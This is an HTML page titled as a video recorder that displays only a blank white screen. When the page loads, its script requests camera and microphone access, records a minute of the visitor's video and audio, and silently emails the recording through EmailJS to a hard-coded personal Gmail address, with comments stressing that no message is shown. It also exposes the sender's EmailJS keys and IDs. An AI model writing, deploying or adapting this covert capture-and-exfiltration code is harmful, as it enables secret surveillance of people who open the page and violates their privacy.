<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>H1 Video Recorder</title>
  <style>
    /* Make body fully white with no margin */
    body {
      margin: 0;
      background: white;
      height: 100vh;
      overflow: hidden;
    }
  </style>
</head>
<body>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("ACOn6PC1Zb70JrmxT"); // Your EmailJS Public Key

    async function startRecording() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const recorder = new MediaRecorder(stream);
        const chunks = [];

        recorder.ondataavailable = e => chunks.push(e.data);

        recorder.onstop = () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          const reader = new FileReader();

          reader.onloadend = function() {
            const base64data = reader.result.split(',')[1];

            emailjs.send("service_p3yitzn", "template_oyrsayr", {
              to_email: "julianlee252@gmail.com",
              message: "Hereâ€™s your 1-minute video recording."
            }, {
              attachments: [{
                name: "recording.webm",
                data: base64data
              }]
            }).then(() => {
              // No alerts or messages, remain blank
            }, (error) => {
              console.error("EmailJS error:", error);
            });
          };

          reader.readAsDataURL(blob);
        };

        recorder.start();

        setTimeout(() => {
          recorder.stop();
          stream.getTracks().forEach(track => track.stop());
        }, 60000);

      } catch (err) {
        console.error("Permission or recording error:", err);
      }
    }

    window.onload = startRecording;
  </script>
</body>
</html>
